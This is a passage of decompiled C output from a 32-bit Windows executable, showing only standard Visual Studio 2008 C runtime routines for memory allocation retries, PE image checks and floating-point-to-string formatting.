  if (((byte)DAT_004339f0 & 2) != 0) {
    local_2d4 = 0x10001;
    _memset(&local_32c,0,0x50);
    local_2dc.ExceptionRecord = &local_32c;
    local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
    local_32c.ExceptionCode = 0x40000015;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_2dc);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __set_abort_behavior
// 
// Library: Visual Studio 2008 Release

uint __cdecl __set_abort_behavior(uint _Flags,uint _Mask)

{
  uint uVar1;
  
  uVar1 = DAT_004339f0;
  DAT_004339f0 = ~_Mask & DAT_004339f0 | _Flags & _Mask;
  return uVar1;
}



void __cdecl FUN_00421504(undefined4 param_1)

{
  DAT_004369d8 = param_1;
  return;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_004369dc == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004369dc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  int *piVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    piVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
    if (DAT_004369dc == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004369dc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_004369dc == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004369dc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  _fastzero_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastzero_I(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2 >> 7;
  do {
    *param_1 = (undefined  [16])0x0;
    param_1[1] = (undefined  [16])0x0;
    param_1[2] = (undefined  [16])0x0;
    param_1[3] = (undefined  [16])0x0;
    param_1[4] = (undefined  [16])0x0;
    param_1[5] = (undefined  [16])0x0;
    param_1[6] = (undefined  [16])0x0;
    param_1[7] = (undefined  [16])0x0;
    param_1 = param_1 + 8;
    uVar1 = uVar1 - 1;
  } while (uVar1 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined (*) [16] __cdecl __VEC_memzero(undefined (*param_1) [16],undefined4 param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined (*pauVar5) [16];
  
  uVar2 = (int)param_1 >> 0x1f;
  iVar3 = (((uint)param_1 ^ uVar2) - uVar2 & 0xf ^ uVar2) - uVar2;
  if (iVar3 == 0) {
    uVar2 = param_3 & 0x7f;
    if (param_3 != uVar2) {
      _fastzero_I(param_1,param_3 - uVar2);
    }
    if (uVar2 != 0) {
      puVar4 = (undefined *)((int)param_1 + (param_3 - uVar2));
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
    }
  }
  else {
    iVar3 = 0x10 - iVar3;
    pauVar5 = param_1;
    for (iVar1 = iVar3; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*pauVar5)[0] = 0;
      pauVar5 = (undefined (*) [16])(*pauVar5 + 1);
    }
    __VEC_memzero((undefined (*) [16])((int)param_1 + iVar3),0,param_3 - iVar3);
  }
  return param_1;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2008 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = ExceptionList;
  local_c = DAT_00432c20 ^ 0x430640;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0) {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}



// Library Function - Single Match
//  __forcdecpt_l
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = ***(byte ***)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __cropzeros_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __positive
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __positive(double *arg)

{
  if (0.0 < *arg != (*arg == 0.0)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __fassign_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if (flag == 0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c.f;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



// Library Function - Single Match
//  __fassign
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign(int flag,char *argument,char *number)

{
  __fassign_l(flag,argument,number,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __shift
// 
// Library: Visual Studio 2008 Release

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
    _memmove(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



// Library Function - Single Match
//  __forcdecpt
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt(char *_Buf)

{
  __forcdecpt_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cropzeros
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros(char *_Buf)

{
  __cropzeros_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cftoe2_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  undefined *in_EAX;
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  char *_Dst;
  int iVar6;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    piVar1 = __errno();
    iVar6 = 0x16;
  }
  else {
    iVar6 = param_2;
    if (param_2 < 1) {
      iVar6 = 0;
    }
    if (iVar6 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      puVar5 = puVar4;
      if (0 < param_2) {
        puVar5 = puVar4 + 1;
        *puVar4 = *puVar5;
        *puVar5 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar5 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar2 = _strcpy_s(_Dst,(rsize_t)puVar4,"e+000");
      if (eVar2 == 0) {
        if (param_3 != 0) {
          *_Dst = 'E';
        }
        if (*(char *)param_4[3] != '0') {
          iVar6 = param_4[1] + -1;
          if (iVar6 < 0) {
            iVar6 = -iVar6;
            _Dst[1] = '-';
          }
          if (99 < iVar6) {
            iVar3 = iVar6 / 100;
            iVar6 = iVar6 % 100;
            _Dst[2] = _Dst[2] + (char)iVar3;
          }
          if (9 < iVar6) {
            iVar3 = iVar6 / 10;
            iVar6 = iVar6 % 10;
            _Dst[3] = _Dst[3] + (char)iVar3;
          }
          _Dst[4] = _Dst[4] + (char)iVar6;
        }
        if (((DAT_00436b1c & 1) != 0) && (_Dst[2] == '0')) {
          _memmove(_Dst + 2,_Dst + 3,3);
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0;
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    piVar1 = __errno();
    iVar6 = 0x22;
  }
  *piVar1 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar6;
}



// Library Function - Single Match
//  __cftoe_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftoe_l(double *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = (param_3 - (local_30.sign == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(local_30.sign == 0x2d),_SizeInBytes,
                      param_4 + 1,&local_30);
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\0',param_6);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftoe
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l(_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __cftoa_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoa_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  ushort uVar1;
  int *piVar2;
  size_t _SizeInBytes;
  errno_t eVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  int iVar15;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    iVar15 = 0x16;
LAB_00421c79:
    *piVar2 = iVar15;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar15;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar2 = __errno();
    iVar15 = 0x22;
    goto LAB_00421c79;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - 2;
    }
    eVar3 = __cftoe(param_1,param_2 + 2,_SizeInBytes,param_4,0);
    if (eVar3 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return eVar3;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return eVar3;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar4 = _strrchr(param_2 + 2,0x65);
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar4[3] = '\0';
    }
    goto LAB_00421f9d;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pcVar11 = param_2 + 3;
  pcVar4 = param_2 + 4;
  if (param_4 == 0) {
    *pcVar11 = '\0';
  }
  else {
    *pcVar11 = ***(char ***)(local_28[0] + 0xbc);
  }
  if (((*(uint *)((int)param_1 + 4) & 0xfffff) != 0) || (local_c = 0, *(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar1 = (short)uVar13 + 0x30;
      if (0x39 < uVar1) {
        uVar1 = uVar1 + sVar9;
      }
      local_8 = local_8 + -4;
      *pcVar4 = (char)uVar1;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pcVar4 = pcVar4 + 1;
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pcVar10 = pcVar4, 8 < (ushort)uVar13)) {
      while( true ) {
        pcVar5 = pcVar10 + -1;
        if ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;
        *pcVar5 = '0';
        pcVar10 = pcVar5;
      }
      if (pcVar5 == pcVar11) {
        pcVar10[-2] = pcVar10[-2] + '\x01';
      }
      else if (*pcVar5 == '9') {
        *pcVar5 = (char)sVar9 + ':';
      }
      else {
        *pcVar5 = *pcVar5 + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    _memset(pcVar4,0x30,param_4);
    pcVar4 = pcVar4 + param_4;
  }
  if (*pcVar11 == '\0') {
    pcVar4 = pcVar11;
  }
  *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar13 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar6 = (uint)(uVar13 & 0x7ff);
  uVar7 = uVar6 - local_18;
  uVar6 = (uint)(uVar6 < local_18);
  uVar8 = -uVar6;
  if (uVar6 == 0) {
    pcVar4[1] = '+';
  }
  else {
    pcVar4[1] = '-';
    bVar12 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar12);
  }
  pcVar10 = pcVar4 + 2;
  *pcVar10 = '0';
  pcVar11 = pcVar10;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_00421f4c:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_00421f57;
  }
  else {
    uVar14 = __alldvrm(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar10 = (char)uVar14 + '0';
    pcVar11 = pcVar4 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar11 == pcVar10) goto LAB_00421f4c;
LAB_00421f57:
    uVar14 = __alldvrm(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar11 != pcVar10) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar14 = __alldvrm(uVar7,uVar8,10,0);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar11 = (char)uVar7 + '0';
  pcVar11[1] = '\0';
LAB_00421f9d:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  __cftof2_l
// 
// Library: Visual Studio 2008 Release

undefined4 __thiscall
__cftof2_l(void *this,int param_1,size_t param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  undefined *puVar3;
  undefined4 uVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      puVar3 = (undefined *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this);
      *puVar3 = 0x30;
      puVar3[1] = 0;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      __shift();
      *(undefined *)this = 0x30;
      puVar3 = (undefined *)((int)this + 1);
    }
    else {
      puVar3 = (undefined *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      __shift();
      *puVar3 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        _memset(puVar3 + 1,0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



// Library Function - Single Match
//  __cftof_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftof_l(double *param_1,undefined *param_2,int param_3,size_t param_4,localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == -1) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (uint)(local_30.sign == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,local_30.decpt + param_4,
                      &local_30);
    if (eVar2 == 0) {
      __cftof2_l(param_2,param_3,param_4,'\0',param_5);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftog_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftog_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  char *pcVar1;
  int *piVar2;
  errno_t eVar3;
  size_t _SizeInBytes;
  char *pcVar4;
  _strflt local_34;
  int local_24;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_34,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_24 = local_34.decpt + -1;
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (local_34.sign == 0x2d);
    }
    eVar3 = __fptostr(param_2 + (local_34.sign == 0x2d),_SizeInBytes,param_4,&local_34);
    if (eVar3 == 0) {
      local_34.decpt = local_34.decpt + -1;
      if ((local_34.decpt < -4) || ((int)param_4 <= local_34.decpt)) {
        __cftoe2_l(param_3,param_4,param_5,&local_34.sign,'\x01',param_6);
      }
      else {
        pcVar1 = param_2 + (local_34.sign == 0x2d);
        if (local_24 < local_34.decpt) {
          do {
            pcVar4 = pcVar1;
            pcVar1 = pcVar4 + 1;
          } while (*pcVar4 != '\0');
          pcVar4[-1] = '\0';
        }
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
      }
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cfltcvt_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l(arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      eVar1 = __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
    else {
      eVar1 = __cftog_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



// Library Function - Single Match
//  __cfltcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2008 Release

void __initp_misc_cfltcvt_tab(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  do {
    piVar1 = (int *)((int)&PTR_LAB_004339f4 + uVar3);
    iVar2 = __encode_pointer(*piVar1);
    uVar3 = uVar3 + 4;
    *piVar1 = iVar2;
  } while (uVar3 < 0x28);
  return;
}



// Library Function - Single Match
//  __setdefaultprecision
// 
// Library: Visual Studio 2008 Release

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x00422389)
// Library Function - Single Match
//  __ms_p5_test_fdiv
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __ms_p5_test_fdiv(void)

{
  return 0;
}



// Library Function - Single Match
//  __ms_p5_mp_test_fdiv
// 
// Library: Visual Studio 2008 Release

void __ms_p5_mp_test_fdiv(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA("KERNEL32");
